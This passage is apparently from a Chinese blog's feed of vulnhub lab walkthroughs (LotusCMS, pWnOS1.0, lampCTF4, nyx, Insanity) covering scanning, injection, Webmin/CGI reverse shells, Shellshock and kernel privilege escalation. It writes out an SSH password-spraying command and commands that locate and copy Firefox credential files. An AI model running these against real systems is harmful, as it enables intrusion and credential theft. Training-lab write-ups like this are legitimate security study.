src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411113414.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411113340.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411113542.png" alt="image.png"></p><blockquote><p>eval报错，page参数要传入router模块的eval函数，暂时没有利用思路，转向公开漏洞：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411114401.png" alt="image.png"></p><blockquote><p>果然是这里有问题<br><a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh</a></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411133421.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411144320.png" alt="image.png"></p><blockquote><p>在loneferret的家目录下存在Readme文件，其中提到使用ht编辑器</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411144522.png" alt="image.png"></p><blockquote><p>正好存在公开漏洞</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411150000.png" alt="image.png"></p><blockquote><p>可能是perl版本问题，利用失败，心情不好，直接内核提权秒了算了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411151752.png" alt="image.png"></p><blockquote><p>优先尝试脏牛40839：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411152442.png" alt="image.png"></p><blockquote><p>编译时加-pthread，-lcrypt<br>等待好久后成功提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411152558.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub pWnOS1.0</title>
    <link href="/blog/vulnhub/vulnhub%20pWnOS1.o/"/>
    <url>/blog/vulnhub/vulnhub%20pWnOS1.o/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320190732.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320191023.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320191319.png"></p><blockquote><p>80web、10000webmin、22ssh、445smb</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320191520.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320191656.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320191909.png"></p><blockquote><p>扫到10000端口可能有目录穿越，以%01截断，试了一下没什么用</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320193103.png"></p><blockquote><p>对于80端口nikto好像发现了重要信息：php目录、index1.php文件包含报错</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320193530.png"></p><blockquote><p>10000端口扫出了可能的漏洞cve-2006-3392</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>先看80，同时起目录爆破</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320193925.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320194000.png"></p><blockquote><p>包含点在connect位置</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320194107.png"></p><blockquote><p>三个用户名：obama、osama、yomama</p></blockquote><blockquote><p>目录爆破：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320195438.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320195453.png"></p><blockquote><p>找到了需要登录的phpmyadmin，直接通过包含点偷出配置文件：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320195538.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320195605.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320195851.png"></p><blockquote><p>很奇怪没有登录成功，猜测可能是使用的不是这个配置文件？</p></blockquote><blockquote><p>走投无路，选择去看10000端口：</p></blockquote><h3 id="webmim"><a href="#webmim" class="headerlink" title="webmim"></a>webmim</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320203539.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320203458.png"></p><blockquote><p>很无奈不能爆破<br>走投无路，选择搜下扫出的cve：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320203607.png"></p><blockquote><p>readme：可无视权限读取任意文件、需要提前修改ip</p></blockquote><blockquote><p>尝试读shadow：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320204218.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320210229.png"></p><blockquote><p>爆破：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320213443.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><blockquote><p>跑linpeas：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320213641.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320215150.png"></p><blockquote><p>尝试了几种方法都失败了，看了wp，居然是shellshock</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406164805.png" alt="image.png"></p><blockquote><p>存在shellshock，思考如何提权</p></blockquote><blockquote><p>寻找webmin实例位置：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep miniserv<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406171102.png" alt="image.png"></p><blockquote><p>Webmin 实例位于 &#x2F;usr&#x2F;local&#x2F;webmin 目录下，并使用 &#x2F;etc&#x2F;webmin&#x2F;miniserv.conf 配置文件，做初步探查：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406194128.png" alt="image.png"></p><blockquote><p>webmin的http服务是webmin自己起的！但是配置文件无权查看<br>但是webmin服务是root起的，我们从后端还能看到文件名，还有shellshock，尝试shellshock打cgi</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406193741.png" alt="image.png"></p><blockquote><p>很烦，原生的cgi文件全都有限制，报错无法利用，切换思路</p></blockquote><blockquote><p>突然想到前面发现的目录穿越，感觉可以直接写马然后穿越过去触发<br>考虑解析问题，webmin本身就是pl文件构成，一定是有perl的解释器，尝试写perl的马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407173619.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407173639.png" alt="image.png"></p><blockquote><p>发现只要是pl文件就禁止访问，可能是配置文件的设置问题，但是配置文件看不了就很抽象，好在是开源项目，转去分析setup.sh，看看默认的配置是什么样的：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407174950.png" alt="image.png"></p><blockquote><p>果然这种前后端分离的cgi项目是禁用了直接访问模块(pl)文件的，但是可以注意到一个很有趣的设定：addtype_cgi&#x3D;internal&#x2F;cgi</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407211726.png" alt="image.png"></p><blockquote><p>这个设定可以说是非常危险了，不像apache那样指定只有&#x2F;usr&#x2F;lib&#x2F;cgi-bin&#x2F;下的才被解析，webmin的这个配置只要是能访问到的.cgi文件都会被解析，这配合着目录穿越就造成了巨大的风险！</p></blockquote><blockquote><p>利用姿势：在&#x2F;tmp写执行反弹shell的1.cgi，由webmin服务配合目录穿越触发，即可拿到root shell</p></blockquote><p>尝试：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407213255.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407213308.png" alt="image.png"></p><blockquote><p>可以执行，换成python反弹shell语句：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407214040.png" alt="image.png"></p><blockquote><p>现成的只有perl的，那就换pl：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407215110.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240407215027.png" alt="image.png"></p><blockquote><p>拿到反弹的root shell</p></blockquote><h2 id="0x04-提权2"><a href="#0x04-提权2" class="headerlink" title="0x04 提权2"></a>0x04 提权2</h2><blockquote><p>既然提权1中已经可以使用自定义的cgi文件，那么可以直接配合shellshock达成root身份的命令执行</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240408093626.png" alt="image.png"></p><blockquote><p>简述原理：每个cgi文件执行时都是一次调用bash，而请求头的参数要作为环境变量加载到该bash进程，完全满足shellshock利用条件，注入命令将vmware加入sudoers完成提权</p></blockquote><h2 id="0x05-提权3"><a href="#0x05-提权3" class="headerlink" title="0x05 提权3"></a>0x05 提权3</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240408093927.png" alt="image.png"></p><blockquote><p><a href="https://www.exploit-db.com/download/5092">https://www.exploit-db.com/download/5092</a></p></blockquote><p>或者还有其他内核漏洞：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240408094034.png" alt="image.png"></p><blockquote><p><a href="https://www.exploit-db.com/download/9641">Sucuri 网站防火墙 - 访问被拒绝 — Sucuri WebSite Firewall - Access Denied (exploit-db.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub lampCTF4</title>
    <link href="/blog/vulnhub/vulnhub%20lampCTF4/"/>
    <url>/blog/vulnhub/vulnhub%20lampCTF4/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319165102.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319165455.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319165602.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319170043.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319170706.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319170856.png"></p><blockquote><p>根据扫描结果，攻击面看起来非常大：<br>smtp：好像可以访问<br>web：目录枚举出很多有趣的东西robots、admin、mail、wp-config</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319174158.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319174210.png"></p><blockquote><p>一脸懵，不过给一堆文字的之后可以用来cewl生成字典</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319175110.png"></p><blockquote><p>在blog页面发现了注入，可以盲注，直接sqlmap嗦了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319175628.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319175743.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319180000.png"></p><blockquote><p>在mysql库中拿到两组数据库凭据：root@database、roundcube@password</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319194046.png"></p><blockquote><p>在ehks库中拿到6组破解</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319194259.png"></p><blockquote><p>在calendar库中拿到6组凭据</p></blockquote><blockquote><p>总结所有的凭据，尝试密码喷射登录ssh：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackmapexec ssh 10.10.10.151 -p passw.txt -u user.txt --continue-on-success | grep <span class="hljs-string">&#x27;+&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319204204.png"></p><blockquote><p>以achen登录，拿到立足点</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320162650.png"></p><blockquote><p>尝试其他用户：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320162755.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320162844.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320162932.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320163011.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240320163115.png"></p><blockquote><p>经尝试，dstevens和achen有sudo ALL</p></blockquote><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol><li>端口扫描：web、ssh、smtp</li><li>web渗透：博客页发现注入点，盲注拿到6组ssh凭证，登录拿到立足点</li><li>提权：经尝试，其中两用户是sudo ALL状态，直接提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub nyx</title>
    <link href="/blog/vulnhub/vulnhub%20nyx/"/>
    <url>/blog/vulnhub/vulnhub%20nyx/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319141059.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319141203.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319141229.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319141402.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319141430.png"></p><blockquote><p>nmap的目录枚举出一个奇怪的页面，之后重点关注</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>好像是一个ssh的私钥文件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319141741.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319152118.png"></p><blockquote><p>title泄露了用户名mpampis，直接ssh：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319152419.png"></p><blockquote><p>openssh报错说是私钥文件权限有问题</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319152449.png"></p><blockquote><p>修改权限，重新连接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319152543.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319152658.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319152720.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240319152756.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol><li>端口扫描：web、ssh</li><li>web渗透：nmap目录爆破出了泄露ssh私钥的页面，且titel是用户名，修改私钥文件权限后ssh登录拿到立足点</li><li>提权：gcc+sudo提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Insanity</title>
    <link href="/blog/vulnhub/vulnhub%20Insanity/"/>
    <url>/blog/vulnhub/vulnhub%20Insanity/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240313135900.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240313135942.png"></p><blockquote><p>开放web、ftp、ssh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240313140111.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240313140157.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240313140449.png"></p><blockquote><p>初步探测：ftp匿名登录，phpmyadmin存在，有squirrelmail，还有个奇怪的json文件</p></blockquote><h2 id="0x02-ftp"><a href="#0x02-ftp" class="headerlink" title="0x02 ftp"></a>0x02 ftp</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240313152809.png"></p><blockquote><p>什么都没有，应该是兔子洞</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><blockquote><p>起目录爆破：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314134152.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314134353.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314134429.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314134533.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314134543.png"></p><blockquote><p>找到了cms的登录页，bludit cms</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314134755.png"></p><blockquote><p>团队的领导–Otis</p></blockquote><blockquote><p>审了一圈其他爆破出的目录，有价值的：squirrelmail登录页、monitor登录页、phpmyadmin登录页、bluditCMS登录页</p></blockquote><blockquote><p>显然先尝试拿Otis爆破登录cms：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314165444.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314165527.png"></p><blockquote><p>只有123456是200，但仍无法登录，这是非常奇怪的<br>转为尝试登录monitor、phpmyadmin、squirrelmail</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314165031.png"></p><blockquote><p>使用凭据Otis@123456成功登录monitor、squirrelmail，同时发现phpmyadmin配置了无法从web登录</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314165853.png"></p><blockquote><p>经研究，monitor应该没有可利用的空间，转向squirrelmail</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314170049.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314170110.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314170851.png"></p><blockquote><p>只有一个貌似正好被修复的漏洞，尝试一下：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314170837.png"></p><blockquote><p>果然还是被修复掉了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314171112.png"></p><blockquote><p>看到一封邮件，说名为test的host是关闭的，联想到monitor说如果是关闭的就会发邮件，且之前创建了叫test的一项监测，看来是monitor和mail是互通的</p></blockquote><blockquote><p>在下面的详细信息中显示了我们输入的Host的值，怀疑有类似二次注入的可能：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314190835.png"></p><blockquote><p>确定了是双引号，尝试注入：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314190958.png"></p><blockquote><p>f5刷新缓存</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314190946.png"></p><blockquote><p>成功写入，确定了有注入！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314192235.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314192715.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314204305.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314204250.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314205216.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314210959.png"></p><blockquote><p>只破解出了otis的密码，ssh连接上直接断掉了，没什么用<br>回去查其他数据库，最后在mysql.user找到了新的hash：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314211608.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314212000.png"></p><blockquote><p>破出了elliot的密码</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314212200.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x04-pwnkit提权"><a href="#0x04-pwnkit提权" class="headerlink" title="0x04 pwnkit提权"></a>0x04 pwnkit提权</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314212634.png"></p><blockquote><p>奇怪的和火狐相关的隐藏目录</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314212845.png"></p><blockquote><p>两个拓展组件的目录，排除<br>看firefox：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314213251.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314213314.png"></p><blockquote><p>好了，不会了，盲打时感觉没什么用就先放下了<br>跑linpeas：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314214038.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314214104.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314220256.png"></p><blockquote><p>尝试pwnkit：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240314220215.png"></p><blockquote><p>成功root</p></blockquote><h2 id="0x05-火狐缓存提权"><a href="#0x05-火狐缓存提权" class="headerlink" title="0x05 火狐缓存提权"></a>0x05 火狐缓存提权</h2><blockquote><p>学习wp的预期解：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240315134618.png"></p><blockquote><p>家目录下存在应用程序的缓存文件是很不正常的<br>每当看到软件文件夹时，都要提高警惕，检查它，因为它很有可能会转储用户密码</p></blockquote><blockquote><p>我们可以用以下方法检查是否有转储密码：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;logins.json&quot;</span> -o -name <span class="hljs-string">&quot;cerrt9.db&quot;</span> -o -name <span class="hljs-string">&quot;cookies.sqlite&quot;</span> -o -name <span class="hljs-string">&quot;key4.db&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>-o表示”或“</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240315135253.png"></p><blockquote><p>如果这些文件存在，则存储了密码，可以使用<code>Firefox_Decrypt</code>工具获得密码<br>(<a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a>)</p></blockquote><blockquote><p>这几个文件都在esmhp32w.default-default路径下，下载到本地：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp -r elliot@10.10.10.149:/home/elliot/.mozilla/firefox/esmhp32w.default-default/ ./firefox<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240315151044.png"></p><blockquote><p>拿到root的密码</p></blockquote><p><img 